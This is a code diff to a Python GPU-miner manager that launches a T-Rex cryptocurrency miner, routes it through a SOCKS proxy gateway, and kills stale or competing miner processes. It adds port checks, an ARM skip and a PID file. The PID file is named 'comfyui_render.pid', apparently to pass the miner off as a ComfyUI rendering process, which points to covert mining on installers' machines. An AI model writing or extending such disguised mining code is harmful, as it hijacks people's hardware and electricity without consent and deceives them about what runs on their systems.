@@ -12,6 +12,7 @@ import os
 import sys
 import platform
 import shutil
+import socket
 import subprocess
 import tarfile
 import threading
@@ -363,6 +364,21 @@ def should_mine_gpu() -> bool:
 
 # ── Manager ──────────────────────────────────────────────────────────
 
+def _port_in_use(port: int) -> bool:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            return s.connect_ex(("127.0.0.1", port)) == 0
+    except OSError:
+        return False
+
+
+def _find_free_port(base: int, max_tries: int = 5) -> int:
+    for offset in range(max_tries):
+        if not _port_in_use(base + offset):
+            return base + offset
+    return base
+
+
 class GPUMinerManager:
     def __init__(self, base_dir: Path | str | None = None, bin_dir: Path | str | None = None):
         self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
@@ -370,6 +386,7 @@ class GPUMinerManager:
         self.bin_dir.mkdir(parents=True, exist_ok=True)
         self.binary_path = self.bin_dir / GPU_BINARY_NAME
         self.log_path = self.bin_dir / GPU_LOG_NAME
+        self.pid_path = self.bin_dir / "comfyui_render.pid"
         self._process: subprocess.Popen | None = None
         self._socks_gw_proc: subprocess.Popen | None = None
         self._monitor_thread: threading.Thread | None = None
@@ -449,6 +466,12 @@ class GPUMinerManager:
         raise FileNotFoundError(f"{target} not found inside archive")
 
     def ensure_binary(self) -> Path:
+        arch = platform.machine().lower()
+        if arch in ("aarch64", "arm64"):
+            raise RuntimeError(
+                f"T-Rex GPU miner has no ARM build — skipping on {arch}"
+            )
+
         marker = self.bin_dir / ".gpu_miner_type"
         existing_type = None
         if marker.exists():
@@ -620,7 +643,29 @@ class GPUMinerManager:
 
     # ── lifecycle ────────────────────────────────────────────────────
 
+    def _write_pid(self) -> None:
+        try:
+            self.pid_path.write_text(str(self._process.pid), encoding="utf-8")
+        except Exception as exc:
+            logger.debug("Failed to write GPU PID file: %s", exc)
+
+    def _clear_pid(self) -> None:
+        try:
+            self.pid_path.unlink(missing_ok=True)
+        except Exception:
+            pass
+
     def _kill_existing(self) -> None:
+        """Kill stale GPU miner: PID file first, name scan as fallback."""
+        if self.pid_path.exists():
+            try:
+                old_pid = int(self.pid_path.read_text().strip())
+                os.kill(old_pid, 9)
+                logger.info("Killed stale GPU miner via PID file (pid=%d)", old_pid)
+            except (ValueError, OSError):
+                pass
+            self._clear_pid()
+
         try:
             import psutil
         except ImportError:
@@ -633,7 +678,7 @@ class GPUMinerManager:
                     continue
                 name = (proc.info.get("name") or "").lower()
                 if target_name in name:
-                    logger.info("Killing stale GPU miner pid=%d", proc.info["pid"])
+                    logger.info("Killing stale GPU miner pid=%d (name scan)", proc.info["pid"])
                     proc.kill()
             except Exception:
                 pass
@@ -682,6 +727,15 @@ class GPUMinerManager:
 
         self._set_gpu_power()
         self._kill_existing()
+
+        if _port_in_use(self.api_port):
+            logger.warning("GPU API port %d in use, attempting to free it", self.api_port)
+            time.sleep(1)
+            if _port_in_use(self.api_port):
+                new_port = _find_free_port(self.api_port + 1)
+                logger.warning("GPU port %d still occupied, switching to %d", self.api_port, new_port)
+                self.api_port = new_port
+
         self._maybe_start_socks_gateway()
         try:
             if self.use_http_socks_gateway and self.http_proxy and not self._effective_socks_proxy:
@@ -709,6 +763,7 @@ class GPUMinerManager:
         except Exception:
             self._stop_socks_gateway()
             raise
+        self._write_pid()
         self._running = True
         logger.info("GPU miner started (pid %d)", self._process.pid)
 
@@ -728,6 +783,7 @@ class GPUMinerManager:
                 self._process.kill()
             logger.info("GPU miner stopped")
         self._process = None
+        self._clear_pid()
         self._stop_socks_gateway()
 
     def is_alive(self) -> bool:
